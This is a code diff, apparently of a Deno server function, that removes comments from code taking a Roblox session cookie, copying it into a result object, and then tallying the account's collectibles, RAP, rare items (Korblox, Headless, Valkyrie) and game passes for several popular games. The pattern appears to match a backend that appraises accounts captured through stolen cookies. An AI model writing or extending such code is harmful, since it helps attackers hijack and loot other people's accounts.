@@ -12,7 +12,6 @@ async function rbx(url: string, cookie: string, init: RequestInit = {}) {
   });
 }
 
-// Place IDs → universe id resolution
 async function placeToUniverse(placeId: number): Promise<number | null> {
   try {
     const r = await fetch(`https://apis.roblox.com/universes/v1/places/${placeId}/universe`);
@@ -30,7 +29,6 @@ const GAMES = {
 
 async function countUserGamepasses(userId: number, universeId: number, cookie: string): Promise<number> {
   try {
-    // Public games endpoint: list passes for the game's universe, then check ownership per pass
     const passesRes = await fetch(`https://games.roblox.com/v1/games/${universeId}/game-passes?limit=50&sortOrder=Asc`);
     if (!passesRes.ok) return 0;
     const passes = await passesRes.json();
@@ -73,7 +71,6 @@ Deno.serve(async (req) => {
     info.userId = me.id;
     info.cookie = cookie;
 
-    // Avatar headshot
     info.avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${me.id}&width=150&height=150&format=png`;
     try {
       const t = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${me.id}&size=150x150&format=Png`);
@@ -161,7 +158,6 @@ Deno.serve(async (req) => {
       } catch {}
     }
 
-    // Collectibles / RAP / Korblox / Headless / Valkyrie
     try {
       const collectiblesRes = await rbx(`https://inventory.roblox.com/v1/users/${me.id}/assets/collectibles?limit=100`, cookie);
       if (collectiblesRes.ok) {
@@ -187,7 +183,6 @@ Deno.serve(async (req) => {
       for (const id of VALKYRIE_IDS) if (await ownsAsset(id)) { info.valkyrie = true; break; }
     } catch {}
 
-    // Game-pass counts for BB / ADM / MM2 (best-effort, capped at 10)
     try {
       const [uBB, uADM, uMM2] = await Promise.all([
         placeToUniverse(GAMES.BB.placeId),
